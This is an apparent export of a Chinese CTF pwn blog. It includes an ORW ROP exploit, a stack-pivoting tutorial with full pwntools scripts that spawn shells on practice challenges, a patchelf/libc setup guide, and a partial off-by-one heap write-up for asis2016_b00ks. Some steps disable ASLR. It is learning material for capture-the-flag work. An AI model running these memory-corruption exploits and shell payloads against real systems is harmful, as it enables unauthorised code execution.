<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)    # open</span><br><span class="line">payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)     # read</span><br><span class="line">payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)     #write    #复用我们的rsi和rdx，不用重新pop了</span><br><span class="line"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br><span class="line">payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)</span><br><span class="line">io.sendline(payload3)</span><br></pre></td></tr></table></figure>

<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level=&#x27;DEBUG&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">io = remote(&#x27;node5.anna.nssctf.cn&#x27;,21109)</span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line">pop_rdi = 0x401393</span><br><span class="line">ret = 0x40101a</span><br><span class="line">leave_ret = 0x4012be</span><br><span class="line">libc_dump_rsi = 0x2601f</span><br><span class="line">libc_dump_rdx = 0x142c92</span><br><span class="line">vuln_addr = 0x4012C0</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendlineafter(&#x27;before you try to solve this task.&#x27;,payload1)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">open_addr = libc_base + libc.symbols[&#x27;open&#x27;]</span><br><span class="line"># read_addr = libc_base + libc.symbols[&#x27;read&#x27;]         </span><br><span class="line">read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="line">write_addr = libc_base + libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rsi = libc_base + libc_dump_rsi</span><br><span class="line">pop_rdx =  libc_base + libc_dump_rdx</span><br><span class="line"></span><br><span class="line">newrbp = elf.bss(0x200)</span><br><span class="line">payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)</span><br><span class="line">payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)        # open</span><br><span class="line">payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)         # read</span><br><span class="line">payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)          #write</span><br><span class="line"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br><span class="line">payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ORW</tag>
        <tag>极客大挑战_2019_Not_Bad</tag>
        <tag>HGAME_2023_week1_orw</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移学习总结</title>
    <url>/2024/11/07/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前置知识：什么是栈迁移？"><a href="#前置知识：什么是栈迁移？" class="headerlink" title="前置知识：什么是栈迁移？"></a>前置知识：什么是栈迁移？</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9mYW5jeS1yb3AvI3N0YWNrLXBpdm90aW5n">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-pivoting<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>首先看一下正常的程序结构，函数在结束时会进行leave和ret指令<br>——leave做两件事，第一件事是mov esp,ebp，也就是将esp移到ebp的位置，第二件事是pop ebp，也就是将ebp移到上一个函数的记录的位置上去<br>——ret就做一件事pop eip，也就是将esp中的内容弹入eip中，也就是内容放到程序的执行流上。</p>
<span id="more"></span>

<p><img src="/images/p1/s1.PNG"><br>在栈迁移中，很多情况下我们需要在栈上的返回地址覆盖为leave_ret的gadget上（这里的0xcffc），让程序执行两次leave_ret，那连续的两个leave_ret后栈会发生什么变化呢？<br>回到初始状态，假设我们的栈可以溢出到返回地址，我们将ebp覆盖为esp的地址（0xcfd0），返回地址覆盖为一个leave_ret的gadget，观察下面的图<br><img src="/images/p1/s2.PNG"><br>可以看到，栈在经历过两次leave_ret后，程序的执行流又回到了我们的栈空间，那如果我们在写入数据的时候，从0xcfd4的位置开始写入我们的system函数的地址，那就可以把system函数放到程序的执行流，从而执行我们的system(‘&#x2F;bin&#x2F;sh’)<br>通过两道例题实践栈迁移</p>
<hr>
<h1 id="例1：ciscn-2019-es-2"><a href="#例1：ciscn-2019-es-2" class="headerlink" title="例1：ciscn_2019_es_2"></a>例1：ciscn_2019_es_2</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2Npc2NuXzIwMTlfZXNfMg==">https://buuoj.cn/challenges#ciscn_2019_es_2<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec;file：32位，开启NX保护<br><img src="/images/p1/s3.PNG"></p>
<p>IDA里面分析，栈溢出发生在vul函数，但是只可以溢出0x8的字节，这只能够覆盖ebp_main和返回地址，而想再向栈上像ret2text那样写入system和binsh显然不可行<br><img src="/images/p1/s4.PNG"></p>
<p>这个时候就要考虑栈迁移了<br>程序存在system函数，但没有binsh字符串，我们需要向某个地址写入binsh<br><img src="/images/p1/s5.PNG"></p>
<p>那向哪个位置写入我们的binsh呢？其实就可以写到这个栈中，只要拿到了ebp的地址，就可以通过偏移拿到栈上任意内容的地址。<br>那ebp的地址怎么拿到呢？我们知道read函数结束时会自动加‘\x00’作为字符串的截断，然后输出时遇到’\x00’停止输出，如果我们在第一次read的时候给他填满0x30个字符，那么read就没地方给他补上’\x00’了，那么输出的时候打印完0x30个字符，就会继续打印出ebp的地址了。<br>第一次read拿到ebp的地址后，第二次read就要控制程序的执行流了<br>根据前置知识布置一下栈结构<br><img src="/images/p1/s6.PNG"></p>
<p>gdb调试看一下read后的栈结构，偏移为0x28(&#x3D;0xf8-0xd0)，同时这个0x28也是我们写入的字符串距离ebp的位置<br><img src="/images/p1/s7.PNG"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esp_addr = ebp_addr - 0x38    #这是我们迁移的位置(迁移到栈顶)</span><br><span class="line">binsh_addr = ebp_addr - 0x28    #这是我们写入的binsh距离ebp的位置</span><br></pre></td></tr></table></figure>

<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,26904)</span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_es_2&#x27;)</span><br><span class="line"></span><br><span class="line">system_addr = elf.plt[&#x27;system&#x27;]</span><br><span class="line">leave_ret = 0x08048562          #0x08048562 : leave ; ret</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;a&#x27;*36 + b&#x27;bbbb&#x27;</span><br><span class="line">io.sendafter(&#x27;name?\n&#x27;,payload1)</span><br><span class="line">io.recvuntil(b&#x27;bbbb&#x27;)</span><br><span class="line">ebp_addr = u32(io.recv(4))</span><br><span class="line">success(hex(ebp_addr))</span><br><span class="line">esp_addr = ebp_addr - 0x38</span><br><span class="line">binsh_addr = ebp_addr - 0x28</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;aaaa&#x27;+ p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr) + b&#x27;/bin/sh\x00&#x27;</span><br><span class="line">payload2 = payload2.ljust(0x28,b&#x27;\x00&#x27;) + p32(ebp_addr-0x38) + p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>




<h1 id="例2：-Black-Watch-入群题-PWN1"><a href="#例2：-Black-Watch-入群题-PWN1" class="headerlink" title="例2：[Black Watch 入群题]PWN1"></a>例2：[Black Watch 入群题]PWN1</h1><blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI1tCbGFjayUyMFdhdGNoJTIwJUU1JTg1JUE1JUU3JUJFJUE0JUU5JUEyJTk4XVBXTg==">https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>checksec;file，32位，开启NX保护<br><img src="/images/p1/s8.png"><br>放到IDA里面分析，栈溢出发生在vul_function的buf，溢出的长度为0x20-0x18&#x3D;0x8个字节，跟例1一样，能覆盖掉ebp和返回地址</p>
<p><img src="/images/p1/s9.png"></p>
<p>而与上题有两点不同：<br>一是没有system，所以首先要泄露libc里的函数的地址，然后用libc里的system函数和binsh字符串get shell；<br>二是这里有个变量s，她存到了程序的bss段，bss段我们可以写入0x200的数据。<strong>例1我们是把栈迁移回了栈中，这里我们要把栈迁移到bss段去。</strong><br><img src="/images/p1/s10.png"></p>
<p>所以我们的思路是，</p>
<ol>
<li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一次read的payload1和对应bss段中的结构 </span><br><span class="line">payload1 = b&#x27;aaaa&#x27;+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
<p><img src="/images/p1/s11.png"></p>
</li>
<li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/images/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第二次read的payload2 </span><br><span class="line">payload2=cyclic(0x18)+p32(bss)+p32(leave_ret) </span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第三次read的payload3 </span><br><span class="line">payload3=&#x27;aaaa&#x27;+p32(sys_addr)+p32(0xdeadbeef)+p32(binsh_addr)</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li>
</ol>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28739)</span><br><span class="line">elf = ELF(&#x27;./spwn&#x27;)</span><br><span class="line"></span><br><span class="line"># 第一次read</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload1 = b&#x27;aaaa&#x27; + p32(write_plt) + p32(main_addr) +  p32(1) + p32(write_got) + p32(4)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload1)</span><br><span class="line"></span><br><span class="line"># 第二次read</span><br><span class="line">bss = 0x0804A300</span><br><span class="line">leave_ret = 0x08048511</span><br><span class="line">payload2 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload2)</span><br><span class="line">write_addr = u32(io.recv(4))</span><br><span class="line">success(hex(write_addr))</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line"># 第三次read</span><br><span class="line">payload3 = b&#x27;aaaa&#x27; + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)</span><br><span class="line">io.sendafter(b&#x27;What is your name?&#x27;,payload3)</span><br><span class="line"></span><br><span class="line"># 第四次read</span><br><span class="line">payload4 = cyclic(0x18)+p32(bss)+p32(leave_ret)</span><br><span class="line">io.sendafter(b&#x27;What do you want to say?&#x27;,payload4)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈迁移</tag>
        <tag>ciscn_2019_es_2</tag>
        <tag>Black Watch 入群题-PWN1</tag>
      </tags>
  </entry>
  <entry>
    <title>使用glibc-all-in-one和patchelf替换程序依赖的libc文件</title>
    <url>/2024/11/18/%E4%BD%BF%E7%94%A8glibc-all-in-one%E5%92%8Cpatchelf%E6%9B%BF%E6%8D%A2%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<div class="markdown-body">

<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>在做堆题时，由于题目环境与本地环境的差异，直接运行题目文件会出现偏差或错误，可以通过glibc-all-in-one和patchelf工具找到与题目环境相同的libc和ld，重新动态链接文件，即可解决。</p>
<span id="more"></span>

<h1 id="1-glibc-all-in-one下载所需要的libc文件"><a href="#1-glibc-all-in-one下载所需要的libc文件" class="headerlink" title="1. glibc-all-in-one下载所需要的libc文件"></a>1. glibc-all-in-one下载所需要的libc文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 克隆glibc-all-in-one 仓库</span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line"></span><br><span class="line"># 更新最新版本的glibc</span><br><span class="line">sudo python3 update_list             #</span><br><span class="line"></span><br><span class="line"># 查看可下载的glibc</span><br><span class="line">cat list </span><br><span class="line"></span><br><span class="line"># 下载所需要的glibc     </span><br><span class="line"># 注意download 对应 list ；download_old 对应 list_old </span><br><span class="line">./download 2.23-0ubuntu3_amd64  #./download_old 2.21-0ubuntu4.3_amd64</span><br></pre></td></tr></table></figure>
<p>download之后就可以在glibc-all-in-one&#x2F;libs&#x2F;中可以看到下载的2.23-0ubuntu3_amd64，进入到文件夹中，关注这两个文件<br><img src="/images/p3/image-5.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ld 和 libc文件路径</span><br><span class="line">~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br><span class="line">~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so</span><br></pre></td></tr></table></figure>
<h1 id="2-patchelf-更改程序依赖的libc文件"><a href="#2-patchelf-更改程序依赖的libc文件" class="headerlink" title="2. patchelf 更改程序依赖的libc文件"></a>2. patchelf 更改程序依赖的libc文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装 patchelf</span><br><span class="line">sudo apt -y install patchelf</span><br><span class="line"></span><br><span class="line"># 替换 ld 文件</span><br><span class="line">patchelf --set-interpreter &quot;ld文件路径&quot; &quot;程序路径&quot;</span><br><span class="line"></span><br><span class="line"># 替换 libc文件</span><br><span class="line">patchelf --replace-needed libc.so.6 &quot;libc文件路径&quot; &quot;程序路径&quot;</span><br><span class="line"></span><br><span class="line"># 查看程序的动态库依赖</span><br><span class="line">ldd &quot;程序路径&quot;</span><br></pre></td></tr></table></figure>


<p><img src="/images/p3/image-6.png" alt="a.out原本的动态库依赖"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># patchelf更改动态库依赖</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so a.out</span><br><span class="line">patchelf --replace-needed libc.so.6 ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so a.out</span><br></pre></td></tr></table></figure>

<p><img src="/images/p3/image-7.png" alt="a.out替换libc文件后的动态库依赖"></p>
</div>]]></content>
      <categories>
        <category>pwn学习</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>glibc-all-in-one</tag>
        <tag>patchelf</tag>
        <tag>动态依赖库</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuCTF刷题】asis2016_b00ks</title>
    <url>/2025/01/26/%E3%80%90buuCTF%E5%88%B7%E9%A2%98%E3%80%91asis2016_b00ks/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>题目链接： <span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FzaXMyMDE2X2IwMGtz">https://buuoj.cn/challenges#asis2016_b00ks<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>2016年的题花了好几天时间才做出来，遂记录一下。<br>通过这道题学习到很多知识点，如off-by-one、钩子函数（malloc_hook和free_hook）的利用，还有就是——当malloc一个接近或超过top_chunk的大小的空间时，程序会使用mmap拓展空间，使得堆以mmap的形式进行扩展，而mmap开辟出的空间与libc基址的偏移是固定的，因此只要拿到mmap开辟出的chunk的地址，就能计算出libc的基地址。</p>
<span id="more"></span>


<h1 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h1><p>进入程序，先输入一个作者名，跳出目录<br><img src="/image.png"></p>
<p>依次尝试，根据输出预定义一下对应函数</p>
<ol>
<li><p>Create a book<br>进入创建要输入name_size , name , des_size , des<br> <img src="/image-1.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def create(name_size , name , des_size , des):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;size: &#x27;,str(name_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,name)</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,str(des_size))</span><br><span class="line">    io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Delete a book<br> 删除功能直接输入book_id就可以了，Book_id可以在打印功能中看到<br> <img src="/image-2.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def delete(book_id):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(id))</span><br></pre></td></tr></table></figure>



</li>
<li><p>Edit a book<br> 编辑功能输入要编辑的Book_id，然后编辑内容<br> <img src="/image-3.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def edit(book_id,des):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,str(book_id))</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,des)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Print book detail<br> 打印所有书的信息，包括作者<br> <img src="/image-4.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def Print():</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;4&#x27;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>Change current author name<br> 切换作者，也是直接输入新作者名就可以<br> <img src="/image-5.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def change(author):</span><br><span class="line">        io.sendlineafter(&#x27;&gt; &#x27;,&#x27;5&#x27;)</span><br><span class="line">        io.sendlineafter(&#x27;: &#x27;,author)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>放入IDA里面，对一些函数进行重命名<br><img src="/image-6.png"><br>先看scanf_author函数，通过前面的运行测试我们能猜出来大概是输入作者名的函数，点进去看到确实是让我们输入作者名<br><img src="/image-7.png"><br>是通过调用scanf_to_ptr的函数输入作者名，并且有两个参数，第一个参数off_202018其实是data段上的一个指针<br><img src="/image-9.png"><br>点进去函数看一下<br><img src="/image-8.png"><br>可以看到，通过循环变量i向off_202018这个指针的地址读入作者名，第二个参数在 i=&#x3D;a2 判断中作为循环终止的条件，注意到i是从0开始变化，如果循环条件是 i&#x3D;&#x3D;a2 ，这个循环实际上会执行33次，就导致作者名的长度是33个字节，有一个字节的溢出。<br><strong>scanf_to_ptr的函数存在off-by-one漏洞</strong></p>
<h2 id="Create-a-book"><a href="#Create-a-book" class="headerlink" title="Create a book"></a>Create a book</h2><p>首先输入name_size的大小，然后根据size分配书名的堆，并把堆地址给ptr_name。如果堆空间分配成功，则向此堆中写入书名（第21行）<br><img src="/image-11.png"><br>注意写入书名调用的是scanf_to_ptr函数，我们分析过这个函数的功能是向第一个参数对应的空间写入内容，并且这个函数存在off-by-one漏洞。</p>
<p>同样的操作，再输入desc_size，根据size再分配一个堆给书的内容<br><img src="/image-12.png"><br>如果堆空间分配成功，则调用漏洞函数scanf_to_ptr向堆中写入书的内容</p>
<p>接下来看这里，分配了一个0x20的空间给一个变量，而这个变量其实存着一个结构体<br><img src="/image-13.png"></p>
<p>第56、58、59、60行描述了结构体的成员变量，根据这些信息还原一下结构体是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct &#123;               </span><br><span class="line">    int id;          </span><br><span class="line">    char *name;                 </span><br><span class="line">    char *description;          </span><br><span class="line">    int description_size; </span><br><span class="line">&#125; Book;</span><br></pre></td></tr></table></figure>
<p>可以看到，程序用一个结构体去描述图书的信息</p>
<p>57行将结构体的地址赋给了off_202010指针，而这个地址我们之前见过一次。在main函数的一开始，我们<strong>在off_202018指针指向的地址存放了作者名，在off_202010指针指向的地址存放图书结构体</strong><br><img src="/image-17.png"><br><strong>注意黄色标注的区域，作者名在超过0x20——也就是32个字节后，就会来到off_202010指针所指的空间。我们在前面分析知道，作者名是通过scanf_to_ptr函数读入，而这个函数存在off_by_one漏洞，导致作者名有一个字节的溢出，而这个溢出则会直接覆盖off_202010的第一个低字节。</strong><br>如果我们给作者名输入32个字符，因为字符串是\x00结尾，所以\x00会作为第33个字符溢出到off_202010的第一个低字节。</p>
<h2 id="Delete-a-book"><a href="#Delete-a-book" class="headerlink" title="Delete a book"></a>Delete a book</h2><p>delete函数通过free释放空间，并且置为0，不存在UAF漏洞<br><img src="/image-15.png"></p>
<h2 id="Change-current-author-name"><a href="#Change-current-author-name" class="headerlink" title="Change current author name"></a>Change current author name</h2><p>改变作者时，scanf_to_ptr同样是向off_202018的空间读入作者名<br><img src="/image-16.png"></p>
<h2 id="Efit-和-Print"><a href="#Efit-和-Print" class="headerlink" title="Efit 和 Print"></a>Efit 和 Print</h2><p>这两个函数没什么特殊的<br><img src="/image-18.png"><br><img src="/image-19.png"></p>
<h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><h2 id="1-替换libc"><a href="#1-替换libc" class="headerlink" title="1.替换libc"></a>1.替换libc</h2><p>由于是2016年的题，本地环境很难与远程环境一致，我这里用patchelf换了ubuntu 16的libc和ld，进行动态调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./b00ks</span><br><span class="line">patchelf --set-interpreter ~/Desktop/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./b00ks </span><br></pre></td></tr></table></figure>
<p>ldd验证一下<br><img src="/image-20.png"></p>
<h2 id="2-动态调试-泄露book1-addr"><a href="#2-动态调试-泄露book1-addr" class="headerlink" title="2.动态调试 &amp;&amp; 泄露book1_addr"></a>2.动态调试 &amp;&amp; 泄露book1_addr</h2><p>在动态调试之前可以先把ASLR保护关掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">//重启机器后ASLR保护会自动打开    </span><br></pre></td></tr></table></figure>

<p>gdb r 调试运行程序，输入作者名时输入32个字节<br><img src="/image-21.png"><br>ctrl+c 进入调试<br><img src="/image-22.png"><br>记录起始地址0x555555400000，作者名在偏移off_202018处，定位到作者名地址，<strong>绿框中的\x00其实是作者名溢出的字节</strong><br><img src="/image-24.png"></p>
<p>按c回到程序中，创建一本书名和内容大小均为10的图书<br><img src="/image-25.png"><br>ctrl+c 进入调试，看看内存布局<br><img src="/image-26.png"><br>发现在作者名后面紧跟上了一个地址，根据静态分析我们推测这个地址指向刚刚创建的图书结构体，跟进去看的确如此<br><img src="/image-27.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555607460 = 图书结构体 = book1_id</span><br><span class="line">0x0000555555607468 = book1_name</span><br><span class="line">0x0000555555607470 = book1_desc</span><br><span class="line">0x0000555555607478 = book1_desc_size</span><br></pre></td></tr></table></figure>
<p>并且，由于author和存放图书结构体的地址是挨着的，当我们print作者名的时候，由于没有\x00截断，也会把图书结构体地址泄露出来<br><img src="/image-44.png"><br><img src="/image-45.png"><br>通过下面的脚本泄露book1_addr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io.sendline(b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaa&#x27;)</span><br><span class="line">create(10,b&#x27;AAAA&#x27;,10,b&#x27;aaaa&#x27;)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(&#x27;haaa&#x27;)</span><br><span class="line">book1_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;book1 addr(real_book1_id):&quot; + hex(book1_addr))</span><br></pre></td></tr></table></figure>


<p>根据前面的分析，如果我们向作者名输入32个字符，会溢出\x00,然后覆盖黄框中的地位\x60为\x00<br><img src="/image-26.png"></p>
<p>验证一下，回到程序中，重新输入32个字节的作者名<br><img src="/image-28.png"><br>再查看内存，确实地位被覆盖为了\x00<br><img src="/image-29.png"><br>此时，程序会认为0x0000555555607400是book1结构体的地址（也是book1_id）<br><img src="/image-31.png"><br>而此时，这里什么都没有，显然这里是存在漏洞的，那该怎么利用呢？<br><strong>多试几次我们会发现，根据我们输入的name_size和desc_size的不同，图书结构体的地址会发生变化</strong><br>当name_size&#x3D;64，desc_size&#x3D;32时<br><img src="/image-33.png"><br>当name_size&#x3D;256，desc_size&#x3D;32时<br><img src="/image-34.png"></p>
<h2 id="3-fake-book的故事"><a href="#3-fake-book的故事" class="headerlink" title="3.fake_book的故事"></a>3.fake_book的故事</h2><p>如果我们进行适当的调整，让book1_desc的地址的低位是\x00，比如在我当前环境下name_size&#x3D;208，desc_size&#x3D;32时内存是这样的<br><img src="/image-36.png"><br>此时book1_desc在0x0000555555607500这个地址，我们可以通过edit功能修改这里的内容</p>
<p>为什么要这样做呢？想想off_by_one漏洞的利用，我们说过我们可以通过change_author，输入32个字节让他溢出<br><img src="/image-37.png"><br>导致上图中红色框框的地址低位变为\x00<br><img src="/image-38.png"><br>现在再来看看是什么情况?现在程序认为黄色标注的才是他的book1<br><img src="/image-39.png"></p>
